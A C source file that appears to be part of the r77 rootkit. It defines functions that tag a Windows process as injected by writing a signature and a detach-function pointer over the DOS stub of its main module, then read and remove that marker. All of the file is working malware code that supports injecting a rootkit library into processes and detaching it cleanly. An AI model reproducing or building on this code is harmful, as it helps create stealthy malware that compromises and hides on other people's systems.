#include "r77process.h"
#include "r77def.h"
#include "r77win.h"

WORD GetR77Header(LPVOID *detachAddress)
{
	LPBYTE module = (LPBYTE)GetModuleHandleW(NULL);
	if (module)
	{
		WORD signature = *(LPWORD) & module[R77_HEADER_OFFSET];
		if (signature == R77_SIGNATURE || signature == R77_SERVICE_SIGNATURE || signature == R77_HELPER_SIGNATURE)
		{
			if (detachAddress) *detachAddress = (LPVOID) * (PDWORD64) & module[R77_HEADER_OFFSET + 2];
			return signature;
		}
	}

	return 0;
}
BOOL WriteR77Header(WORD signature, LPVOID detachAddress)
{
	BOOL result = FALSE;

	// Store the r77 header in the main module.
	LPBYTE module = (LPBYTE)GetModuleHandleW(NULL);
	if (module)
	{
		// The r77 header is written over the DOS stub.
		LPWORD signaturePtr = (LPWORD) & module[R77_HEADER_OFFSET];

		// Do not write the signature, if this process already has an r77 signature.
		if (*signaturePtr != R77_SIGNATURE && *signaturePtr != R77_SERVICE_SIGNATURE && *signaturePtr != R77_HELPER_SIGNATURE)
		{
			DWORD oldProtect;
			if (VirtualProtect(signaturePtr, 10, PAGE_READWRITE, &oldProtect))
			{
				// Check again right before writing to mitigate a race condition.
				if (*signaturePtr != R77_SIGNATURE && *signaturePtr != R77_SERVICE_SIGNATURE && *signaturePtr != R77_HELPER_SIGNATURE)
				{
					// The current process is now marked as injected and therefore, cannot be injected again.
					*signaturePtr = signature;

					// Write a function pointer that can be invoked using NtCreateThreadEx to detach the injected library gracefully.
					*(PDWORD64)&module[R77_HEADER_OFFSET + 2] = (DWORD64)detachAddress;

					VirtualProtect(signaturePtr, 10, oldProtect, &oldProtect);
					result = TRUE;
				}
			}
		}
	}

	return result;
}
VOID RemoveR77Header()
{
	LPBYTE module = (LPBYTE)GetModuleHandleW(NULL);
	if (module)
	{
		LPWORD signaturePtr = (LPWORD) & module[R77_HEADER_OFFSET];

		DWORD oldProtect;
		if (VirtualProtect(signaturePtr, 10, PAGE_READWRITE, &oldProtect))
		{
			// Remove the r77 header by overwriting the signature in the DOS header.
			*(LPWORD)&module[R77_HEADER_OFFSET] = 0;
			*(PDWORD64)&module[R77_HEADER_OFFSET + 2] = 0;

			VirtualProtect(signaturePtr, 10, oldProtect, &oldProtect);
		}
	}
}